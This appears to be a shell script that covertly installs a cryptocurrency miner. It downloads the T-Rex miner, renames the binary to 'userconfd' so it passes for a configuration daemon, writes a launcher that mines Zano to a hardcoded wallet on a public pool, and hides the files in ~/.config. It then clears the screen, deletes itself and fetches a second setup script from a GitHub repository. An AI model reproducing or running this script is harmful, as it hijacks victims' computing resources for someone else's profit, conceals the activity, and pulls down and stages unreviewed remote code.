wget https://trex-miner.com/download/t-rex-0.24.8-linux.tar.gz
clear
mkdir trex
tar -xf t-rex-0.24.8-linux.tar.gz -C trex
rm -rf *.tar.gz

mkdir userconf

mv trex/t-rex userconf/userconfd

echo "#!/bin/sh
./userconfd -a progpowz -o stratum+tcp://zano.luckypool.io:8877 -u ZxDCWD2eM6dZV6VpQpVD1j2fVvbEs56c1E9k2PnGDbUC5Phu5WLqEnSDb8TCWdq72uSwZ48mfYjTB6XyaL6TtFJt1RLXYrQHZ -p x -w rig$1
" >> userconf/rundaemon
chmod +x userconf/rundaemon

rm -rf ~/.config/userconf

mv userconf ~/.config/userconf

rm -rf trex

rm setup.sh

wget https://raw.githubusercontent.com/EyeCaramba29/beta/main/setup.sh

clear
